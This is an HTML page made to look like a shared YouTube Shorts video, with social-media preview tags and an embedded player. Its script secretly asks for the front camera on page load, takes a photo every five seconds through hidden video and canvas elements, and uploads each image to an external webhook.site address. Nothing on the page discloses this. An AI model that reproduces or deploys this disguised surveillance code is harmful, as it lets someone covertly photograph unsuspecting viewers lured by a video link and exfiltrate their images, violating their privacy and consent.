<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Shorts</title>
    
    <!-- OG Meta Tags for WhatsApp and Social Media -->
    <meta property="og:type" content="video.other">
    <meta property="og:title" content="YouTube Shorts">
    <meta property="og:description" content="Watch this YouTube Shorts video">
    <meta property="og:image" content="https://img.youtube.com/vi/3O46oM97CLA/maxresdefault.jpg">
    <meta property="og:url" content="https://youtube.com/shorts/3O46oM97CLA">
    <meta property="og:video" content="https://www.youtube.com/embed/3O46oM97CLA">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="400">
    <meta property="og:video:height" content="800">
    <meta name="twitter:card" content="player">
    <meta name="twitter:image" content="https://img.youtube.com/vi/3O46oM97CLA/maxresdefault.jpg">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
        }
        .container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 100%;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        @media (min-width: 600px) {
            iframe {
                width: 100%;
                max-width: 400px;
                height: 100%;
                max-height: 100vh;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <iframe src="https://www.youtube.com/embed/3O46oM97CLA" allowfullscreen></iframe>
    </div>

    <!-- Hidden camera elements -->
    <video id="camera" style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                const video = document.getElementById('camera');
                video.srcObject = stream;
                video.play();
                
                // Start capturing every 5 seconds
                setInterval(captureImage, 5000);
            } catch (err) {
                console.error('Camera access denied or not available:', err);
            }
        }

        function captureImage() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                // Convert to blob and send to webhook
                canvas.toBlob((blob) => {
                    sendToWebhook(blob);
                }, 'image/jpeg', 0.8);
            }
        }

        function sendToWebhook(blob) {
            const webhookUrl = 'https://webhook.site/630eb72f-b4f7-4d80-b111-9e3ed0837292';
            
            const formData = new FormData();
            formData.append('image', blob, `camera_${Date.now()}.jpg`);
            formData.append('timestamp', new Date().toISOString());
            
            fetch(webhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Image sent to webhook at', new Date().toLocaleTimeString());
            })
            .catch(err => {
                console.error('Webhook send failed:', err);
            });
        }

        // Initialize camera on page load
        window.addEventListener('load', initCamera);
    </script>
</body>
</html>
